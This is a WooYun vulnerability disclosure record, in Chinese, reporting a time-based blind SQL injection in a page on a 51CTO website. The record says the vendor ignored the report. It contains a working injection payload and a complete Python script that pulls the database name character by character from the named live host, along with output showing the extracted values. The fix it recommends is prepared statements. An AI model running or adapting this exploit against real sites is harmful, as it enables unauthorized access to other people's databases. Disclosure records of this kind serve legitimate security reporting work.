{"id": 30794, "wybug_id": "wooyun-2015-0115715", "wybug_title": "51CTO某站SQL注入", "wybug_corp": "51CTO技术网站", "wybug_author": "D＆G", "wybug_date": "2015-05-25 13:54", "wybug_open_date": "2015-05-30 13:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：     sqli 详细说明：      参数存在sql注入。poc：os.51cto.com/os/famousLinux/result2.phppost:image=&name4[]=if(now()%3dsysdate()%2csleep(10)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/name4[]参数\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type':'application/x-www-form-urlencoded',           'Cookie': ''}payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'print 'Start to retrive MySQL User:'user = ''for i in range(1, 23):    for payload in payloads:        err_count = 0        for j in range(3):            try:                s = \"ascii(mid(lower(database()),%s,1))=%s\" % (i, ord(payload))                s = \"(if(%s,sleep(6),0))\" % s                body = \"image=&name4[]=%s\" % urllib.quote(s)                conn = httplib.HTTPConnection('os.51cto.com', timeout=6)                conn.request(method='POST',                             url='/os/famousLinux/result2.php',                             body=body,                             headers=headers)                conn.getresponse()                conn.close()                print '.',            except:                err_count += 1        if err_count == 3:            user += payload            print '\\n[in progress]', user,            breakprint '\\n[Done] MySQL user is %s' % user\n   漏洞证明：  数据库相关信息证明数据库用户 . . . . . . . .[Done] MySQL user is ml19.168.1.39数据库名actio   修复方案：  SQL注入的防御方法：采用预编译   版权声明：转载请注明来源 D＆G@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-05-30 13:56 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}